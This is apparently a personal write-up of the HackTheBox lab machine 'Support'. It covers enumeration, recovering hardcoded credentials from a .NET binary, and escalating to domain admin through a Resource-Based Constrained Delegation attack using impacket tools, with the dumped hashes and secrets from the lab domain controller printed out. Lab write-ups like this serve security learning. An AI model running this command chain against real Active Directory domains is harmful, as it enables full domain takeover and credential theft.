---
tags:
  - rbcd
  - dnspy
  - NET
  - ldap
  - genericall
---
***Overview**: Support is an Easy Rated HTB machine that utilizes basic reverse engineering of a binary to obtain credentials that can be used to perform LDAP queries, which would then be used to retrieve other set of credentials to gain foothold on the DC. The machine then exploit Resource-based Constrained Delegation (RBCD) attack to obtain a TGT as the domain administrator and compromise the DC completely.*
# HTB: Support
## Scanning and Enumeration

- So we start by running our port scan to identify open ports on our target

```shell                                            
┌──(kali㉿kali)-[~/HTB/Support]
└─$ sudo masscan -p1-65535 10.10.11.174 --rate=1000 -e tun0 > ports
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-11-16 11:28:29 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Support]
└─$ cat ports
Discovered open port 464/tcp on 10.10.11.174                                   
Discovered open port 61988/tcp on 10.10.11.174                                 
Discovered open port 389/tcp on 10.10.11.174                                   
Discovered open port 49668/tcp on 10.10.11.174                                 
Discovered open port 53/tcp on 10.10.11.174                                    
Discovered open port 139/tcp on 10.10.11.174                                   
Discovered open port 49664/tcp on 10.10.11.174                                 
Discovered open port 135/tcp on 10.10.11.174                                   
Discovered open port 593/tcp on 10.10.11.174                                   
Discovered open port 5985/tcp on 10.10.11.174                                  
Discovered open port 49674/tcp on 10.10.11.174                                 
Discovered open port 445/tcp on 10.10.11.174                                   
Discovered open port 88/tcp on 10.10.11.174                                    
Discovered open port 49686/tcp on 10.10.11.174                                 
Discovered open port 3269/tcp on 10.10.11.174                                  
Discovered open port 9389/tcp on 10.10.11.174                                  
Discovered open port 3268/tcp on 10.10.11.174                                  
Discovered open port 49700/tcp on 10.10.11.174                                 
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Support]
└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')                                                  
```

- then we run a service scan using nmap, to identify the services on those open ports

```shell
┌──(kali㉿kali)-[~/HTB/Support]
└─$ nmap -sV -sC -p$ports 10.10.11.174 -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-16 06:30 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:30
Completed NSE at 06:30, 0.00s elapsed
Initiating NSE at 06:30
Completed NSE at 06:30, 0.00s elapsed
Initiating NSE at 06:30
Completed NSE at 06:30, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:30
Completed Parallel DNS resolution of 1 host. at 06:30, 0.06s elapsed
Initiating Connect Scan at 06:30
Scanning 10.10.11.174 [18 ports]
Discovered open port 53/tcp on 10.10.11.174
Discovered open port 139/tcp on 10.10.11.174
Discovered open port 445/tcp on 10.10.11.174
Discovered open port 593/tcp on 10.10.11.174
Discovered open port 135/tcp on 10.10.11.174
Discovered open port 88/tcp on 10.10.11.174
Discovered open port 3268/tcp on 10.10.11.174
Discovered open port 49700/tcp on 10.10.11.174
Discovered open port 49686/tcp on 10.10.11.174
Discovered open port 389/tcp on 10.10.11.174
Discovered open port 49664/tcp on 10.10.11.174
Discovered open port 464/tcp on 10.10.11.174
Discovered open port 3269/tcp on 10.10.11.174
Discovered open port 49674/tcp on 10.10.11.174
Discovered open port 49668/tcp on 10.10.11.174
Discovered open port 61988/tcp on 10.10.11.174
Discovered open port 9389/tcp on 10.10.11.174
Discovered open port 5985/tcp on 10.10.11.174
Completed Connect Scan at 06:30, 0.33s elapsed (18 total ports)
Initiating Service scan at 06:30
Scanning 18 services on 10.10.11.174
Completed Service scan at 06:31, 56.44s elapsed (18 services on 1 host)
NSE: Script scanning 10.10.11.174.
Initiating NSE at 06:31
Completed NSE at 06:32, 44.42s elapsed
Initiating NSE at 06:32
Completed NSE at 06:32, 3.70s elapsed
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Nmap scan report for 10.10.11.174
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-16 11:30:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
61988/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-16T11:31:42
|_  start_date: N/A

```

- from the presence of Kerberos, DNS, LDAP and SMB we can tell that it is a Domain controller

### SMB
- so we can start by listing the shares on the SMB, we quickly notice a share support-tools

![](assets/Support_assets/Pasted%20image%2020231116123909.png)

- taking a look at the share we can see that we have several archives of different well known tools, but we notice one UseInfo.exe.zip (it even stands out from the date!)

![](assets/Support_assets/Pasted%20image%2020231116123856.png)

- so we can download the archive for analysis

![](assets/Support_assets/Pasted%20image%2020231116134325.png)

- we can try to access the other shares, like the SYSVOL to see if we can get any Cpassword (GPP attack "***Please take a look at my Active Machine writeup***"), but we don't have access

![](assets/Support_assets/Pasted%20image%2020231116123929.png)

### LDAP

- we can also try to gather information from objects using ldapsearch

```shell
┌──(kali㉿kali)-[~/HTB/Support]
└─$ ldapsearch -H ldap://SUPPORT.local/ -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=support,DC=htb
ldapServiceName: support.htb:dc$@SUPPORT.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=support,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=support,DC=htb
namingContexts: CN=Configuration,DC=support,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
namingContexts: DC=DomainDnsZones,DC=support,DC=htb
namingContexts: DC=ForestDnsZones,DC=support,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 81990
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=support,DC=htb
dnsHostName: dc.support.htb
defaultNamingContext: DC=support,DC=htb
currentTime: 20231116114608.0Z
configurationNamingContext: CN=Configuration,DC=support,DC=htb

```
### Analyzing 

- to analyze the executable file, we need to download dnspy [https://github.com/dnSpy/dnSpy/releases](https://github.com/dnSpy/dnSpy/releases)
- now we can then analyze the executable
- while doing that we notice what looks like a password decode script, what the script seems to be doing is to decode and encrypted password hash, and decode it using a key known as armando

![](assets/Support_assets/Pasted%20image%2020231116142145.png)

![](assets/Support_assets/Pasted%20image%2020231116140230.png)

```
// Token: 0x04000005 RID: 5        
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";       
    
// Token: 0x04000006 RID: 6        
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```
- running this in an online compiler, we get an output
![](assets/Support_assets/Pasted%20image%2020231116140840.png)

- so we get what should be the decoded password as `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
- while assessing the binary, we also see what looks like an Ldap query function. so looking at it i got a username of `support\\ldap`

![](assets/Support_assets/Pasted%20image%2020231116143123.png)

- so we can if  ldap and `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`are valid credentials and they are

![](assets/Support_assets/Pasted%20image%2020231116143143.png)

### RPC
- so we can enumerate for domain users and domain groups with the valid credentials, not that we  `rpcclient -U "ldap" 10.10.11.174` with the password

![](assets/Support_assets/Pasted%20image%2020231116143711.png)

![](assets/Support_assets/Pasted%20image%2020231116143753.png)

```shell
┌──(kali㉿kali)-[/opt/windapsearch]
└─$ rpcclient -U "ldap" 10.10.11.174
Password for [WORKGROUP\ldap]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Shared Support Accounts] rid:[0x44f]

```

- we can grep the username from the above with the command

```shell
grep -o 'user:\[[^]]*\]' output.txt | awk -F '[][]' '{print $2}'
```

![](assets/Support_assets/Pasted%20image%2020231116144233.png)

### Keberos
- we can test if they're valid with kerbrute

```shell
┌──(kali㉿kali)-[~/HTB/Support]
└─$ kerbrute userenum --dc 10.10.11.174 -d SUPPORT.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/16/23 - Ronnie Flathers @ropnop

2023/11/16 08:44:34 >  Using KDC(s):
2023/11/16 08:44:34 >   10.10.11.174:88

2023/11/16 08:44:34 >  [+] VALID USERNAME:       Administrator@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       ldap@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       Guest@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       support@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       smith.rosario@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       hernandez.stanley@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       thomas.raphael@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       wilson.shelby@SUPPORT.htb
2023/11/16 08:44:34 >  [+] VALID USERNAME:       anderson.damian@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       levine.leopoldo@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       bardot.mary@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       raven.clifton@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       ford.victoria@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       stoll.rachelle@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       daughtler.mabel@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       langley.lucy@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       monroe.david@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       cromwell.gerard@SUPPORT.htb
2023/11/16 08:44:35 >  [+] VALID USERNAME:       west.laura@SUPPORT.htb
2023/11/16 08:44:35 >  Done! Tested 20 usernames (19 valid) in 0.363 seconds

```

- we can also grep that using

```shell
grep 'VALID USERNAME:' output.txt | awk -F '[:[:space:]]+' '{print $NF}'
```

![](assets/Support_assets/Pasted%20image%2020231116144912.png)

### Enumerate users with impacket-GetADUsers

- We can also use the impacket-GetADUsers script to enumerate users

```shell
impacket-GetADUsers -all SUPPORT.htb/ldap -dc-ip 10.10.11.174
```

![](assets/Support_assets/Pasted%20image%2020231116145523.png)

### LDAP: with credentials
#### Enumerate users and groups with windapsearch

- Enumerate for groups

```shell
┌──(kali㉿kali)-[/opt/windapsearch]
└─$ python3 windapsearch.py -d SUPPORT.htb --dc-ip 10.10.11.174 -u support\\ldap -G
Password for support\ldap: 
[+] Using Domain Controller at: 10.10.11.174
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=support,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      u:SUPPORT\ldap

[+] Enumerating all AD groups
[+]     Found 49 groups: 

cn: Administrators
distinguishedName: CN=Administrators,CN=Builtin,DC=support,DC=htb

cn: Users
distinguishedName: CN=Users,CN=Builtin,DC=support,DC=htb

cn: Guests
distinguishedName: CN=Guests,CN=Builtin,DC=support,DC=htb

cn: Print Operators
distinguishedName: CN=Print Operators,CN=Builtin,DC=support,DC=htb

cn: Backup Operators
distinguishedName: CN=Backup Operators,CN=Builtin,DC=support,DC=htb

cn: Replicator
distinguishedName: CN=Replicator,CN=Builtin,DC=support,DC=htb

cn: Remote Desktop Users
distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=support,DC=htb

cn: Network Configuration Operators
distinguishedName: CN=Network Configuration Operators,CN=Builtin,DC=support,DC=htb

cn: Performance Monitor Users
distinguishedName: CN=Performance Monitor Users,CN=Builtin,DC=support,DC=htb

cn: Performance Log Users
distinguishedName: CN=Performance Log Users,CN=Builtin,DC=support,DC=htb

cn: Distributed COM Users
distinguishedName: CN=Distributed COM Users,CN=Builtin,DC=support,DC=htb

cn: IIS_IUSRS
distinguishedName: CN=IIS_IUSRS,CN=Builtin,DC=support,DC=htb

cn: Cryptographic Operators
distinguishedName: CN=Cryptographic Operators,CN=Builtin,DC=support,DC=htb

cn: Event Log Readers
distinguishedName: CN=Event Log Readers,CN=Builtin,DC=support,DC=htb

cn: Certificate Service DCOM Access
distinguishedName: CN=Certificate Service DCOM Access,CN=Builtin,DC=support,DC=htb

cn: RDS Remote Access Servers
distinguishedName: CN=RDS Remote Access Servers,CN=Builtin,DC=support,DC=htb

cn: RDS Endpoint Servers
distinguishedName: CN=RDS Endpoint Servers,CN=Builtin,DC=support,DC=htb

cn: RDS Management Servers
distinguishedName: CN=RDS Management Servers,CN=Builtin,DC=support,DC=htb

cn: Hyper-V Administrators
distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=support,DC=htb

cn: Access Control Assistance Operators
distinguishedName: CN=Access Control Assistance Operators,CN=Builtin,DC=support,DC=htb

cn: Remote Management Users
distinguishedName: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb

cn: Storage Replica Administrators
distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=support,DC=htb

cn: Domain Computers
distinguishedName: CN=Domain Computers,CN=Users,DC=support,DC=htb

cn: Domain Controllers
distinguishedName: CN=Domain Controllers,CN=Users,DC=support,DC=htb

cn: Schema Admins
distinguishedName: CN=Schema Admins,CN=Users,DC=support,DC=htb

cn: Enterprise Admins
distinguishedName: CN=Enterprise Admins,CN=Users,DC=support,DC=htb

cn: Cert Publishers
distinguishedName: CN=Cert Publishers,CN=Users,DC=support,DC=htb

cn: Domain Admins
distinguishedName: CN=Domain Admins,CN=Users,DC=support,DC=htb

cn: Domain Users
distinguishedName: CN=Domain Users,CN=Users,DC=support,DC=htb

cn: Domain Guests
distinguishedName: CN=Domain Guests,CN=Users,DC=support,DC=htb

cn: Group Policy Creator Owners
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb

cn: RAS and IAS Servers
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=support,DC=htb

cn: Server Operators
distinguishedName: CN=Server Operators,CN=Builtin,DC=support,DC=htb

cn: Account Operators
distinguishedName: CN=Account Operators,CN=Builtin,DC=support,DC=htb

cn: Pre-Windows 2000 Compatible Access
distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=support,DC=htb

cn: Incoming Forest Trust Builders
distinguishedName: CN=Incoming Forest Trust Builders,CN=Builtin,DC=support,DC=htb

cn: Windows Authorization Access Group
distinguishedName: CN=Windows Authorization Access Group,CN=Builtin,DC=support,DC=htb

cn: Terminal Server License Servers
distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=support,DC=htb

cn: Allowed RODC Password Replication Group
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=support,DC=htb

cn: Denied RODC Password Replication Group
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=support,DC=htb

cn: Read-only Domain Controllers
distinguishedName: CN=Read-only Domain Controllers,CN=Users,DC=support,DC=htb

cn: Enterprise Read-only Domain Controllers
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=support,DC=htb

cn: Cloneable Domain Controllers
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=support,DC=htb

cn: Protected Users
distinguishedName: CN=Protected Users,CN=Users,DC=support,DC=htb

cn: Key Admins
distinguishedName: CN=Key Admins,CN=Users,DC=support,DC=htb

cn: Enterprise Key Admins
distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=support,DC=htb

cn: DnsAdmins
distinguishedName: CN=DnsAdmins,CN=Users,DC=support,DC=htb

cn: DnsUpdateProxy
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=support,DC=htb

cn: Shared Support Accounts
distinguishedName: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb

```

- Enumerate for users

```shell
┌──(kali㉿kali)-[/opt/windapsearch]
└─$ python3 windapsearch.py -d SUPPORT.htb --dc-ip 10.10.11.174 -u support\\ldap -U
Password for support\ldap: 
[+] Using Domain Controller at: 10.10.11.174
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=support,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      u:SUPPORT\ldap

[+] Enumerating all AD users
[+]     Found 20 users: 

cn: Administrator

cn: Guest

cn: krbtgt

cn: ldap

cn: support

cn: smith.rosario

cn: hernandez.stanley

cn: wilson.shelby

cn: anderson.damian

cn: thomas.raphael

cn: levine.leopoldo

cn: raven.clifton

cn: bardot.mary

cn: cromwell.gerard

cn: monroe.david

cn: west.laura

cn: langley.lucy

cn: daughtler.mabel

cn: stoll.rachelle

cn: ford.victoria


[*] Bye!

```

#### Enumerate the domain with ldapdomaindump

- we can gather information on the whole domain using

```shell
ldapdomaindump -u support\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174
```

![](assets/Support_assets/Pasted%20image%2020231116155947.png)

- and now we can look at each json and html file (via broswer)

![](assets/Support_assets/Pasted%20image%2020231116160011.png)

- Now we can query every single thing object using ldapsearch, so we can do that by running

```shell
ldapsearch -H LDAP://SUPPORT.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > ldapsearch.out
```

- and looking through the output, we see sth that looks like a password in the info section of the support user

![](assets/Support_assets/Pasted%20image%2020231116163401.png)

- we can now bruteforce using the credentials we have and we can see that they are actually a valid set of credentials

![](assets/Support_assets/Pasted%20image%2020231116164140.png)

- so using winrm we were able to gain foothold with those credentials, so we have access as support

![](assets/Support_assets/Pasted%20image%2020231116164244.png)

- we can view the user flag

![](assets/Support_assets/Pasted%20image%2020231116164357.png)

## Privilege Escalation

- we can check who we are and also check the permissions we have, we can see that the support user is part of the "Shared Support Accounts" group

![](assets/Support_assets/Pasted%20image%2020231116164637.png)
- and in our privileges we also have the right to add new workstations (computers) to the domain

![](assets/Support_assets/Pasted%20image%2020231116164648.png)

- we can also use our python bloodhound ingester

```shell
sudo bloodhound-python -d SUPPORT.htb -u support -p Ironside47pleasure40Watchful -ns 10.10.11.174 -c all
```

![](assets/Support_assets/Pasted%20image%2020231116165624.png)

- after loading all the data to bloodhound, we will see that the hared Support Accounts group have **"GenericAll"** privileges over the the DC

![](assets/Support_assets/Pasted%20image%2020231116173057.png)

- we can research what this means for us. And one of the possible ways we could exploit this is using a Resource Based Constrained Delegation attack

![](assets/Support_assets/Pasted%20image%2020231116204134.png)

![](assets/Support_assets/Pasted%20image%2020231116204027.png)

![](assets/Support_assets/Pasted%20image%2020231230125139.png)

Resource:  [Resource-based Constrained Delegation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)

```ad-info
- we have the ==object==(which can be a service account or "delegate", we have the ==user== and we have the ==service==(or resource which is the "Constrained object")
- so in constrained Delegation, we can give permissions to any object to act like a user against a service.
- But RBCD sets the object who is able to impersonate any user against the server (Emphasis is on the service)
- The service owner has the authority to define which objects(objects can be users too) are permitted to delegate their authority to the service.
- So the constrained object(the service) will have the the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute with the name of the user(object) that can impersonate any other user against the service
- so with the GenericAll permissions we can set this `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute for a resource
```

- so we can import powermad in the target to add a new user account

```shell
import-module powermad
New-MachineAccount -MachineAccount GR4Y -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](assets/Support_assets/Pasted%20image%2020231116182844.png)

- we can check if this machine account has been created using Poweview

```shell
. .\PowerView.ps1
Get-DomainComputer GR4Y
```

![](assets/Support_assets/Pasted%20image%2020231116183046.png)

- Or we can create a new computer using the `impacket-addcomputer` script

```shell
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -computer-name 'GR4YPC' -computer-pass 'Passw0rd' -dc-ip 10.10.11.174 -computer-group 'CN=Shared Support Accounts,CN=UsersDC=support,DC=htb'
```

![](assets/Support_assets/Pasted%20image%2020231116193308.png)

- now we can conduct the RBCD attack using `impacket-rbcd` script, we will specify our controlled account which is GR4YPC$ and our target account which is DC$ and then specify the action as wtite

```shell
impacket-rbcd -delegate-from 'GR4YPC$' -delegate-to 'DC$' -dc-ip 10.10.11.174 -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```

![](assets/Support_assets/Pasted%20image%2020231116200738.png)

```ad-note
the write action will append value to the `msDS-AllowedToActOnBehalfOfOtherIdentity`
So it will append our controlled account as a value to this property
```

- now we can retrieve a TGT as the user Administrator

```shell
impacket-getST -spn 'cifs/DC.support.htb' -impersonate Administrator -dc-ip '10.10.11.174' 'support.htb/GR4YPC$:Passw0rd'
```

![](assets/Support_assets/Pasted%20image%2020231116200643.png)

```ad-note
REMEMBER: add dc.support.local to `/etc/hosts`
```

- we can then use the TGT to gain a shell as the Domain Administrator using psexec on the DC. and now we are DA

```shell
KRB5CCNAME=Administrator.ccache impacket-psexec support.htb//Administrator@dc.support.htb -k -no-pass
```

![](assets/Support_assets/Pasted%20image%2020231116202613.png)

- and now we can read the root flag

![](assets/Support_assets/Pasted%20image%2020231116202645.png)

- we can also dump the hashes on the DC by running

```shell
export KRB5CCNAME=Administrator.ccache 
impacket-secretsdump -k target-ip 10.10.11.174 dc.support.htb
```

![](assets/Support_assets/Pasted%20image%2020231116203455.png)


```shell
┌──(kali㉿kali)-[~/HTB/Support]
└─$ impacket-secretsdump -k -target-ip 10.10.11.174 dc.support.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf678b2597ade18d88784ee424ddc0d1a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SUPPORT\DC$:plain_password_hex:bcacb948c52993bea7f6a61eff982bfc5c093a3d7cc2b2171c98f152d193bebedbeae13b2f322f46c749f4bb7b66a4bbc44481dec79fb580870bf0c878f5ee54d277c1feeb70acec47645770517145a8fa3cf84fecf322659a060143cfc1b5605ef39dcd9c3c6fdd90b5751e0137b479f659f037e55dba75120d4979d8b9e0f04b749c3db799d01d502c1eb577a40107d688828ad1787bb62229d207d93b8da1247020733da9d84d2c656140eb8ea8cf641b29e5b61bae629f6159a5bbedd060b8de60837c938b6deb7b7f3d8d4fc06a56099d17fc5d93c44181714a1de29bf4e03cca05632408551fdfc4d84628a7c6
SUPPORT\DC$:aad3b435b51404eeaad3b435b51404ee:0bf2e98d5fe97df54362cca10b807bd9:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5f39b9187072640dd3b9ebc53cdcbd2cda166279
dpapi_userkey:0xc98d4a2ff3c17181eaaad459d6383cff7c72bc2d
[*] NL$KM 
 0000   D7 80 3F C7 76 67 B3 22  E7 C9 9B 98 33 D7 F1 A4   ..?.vg."....3...
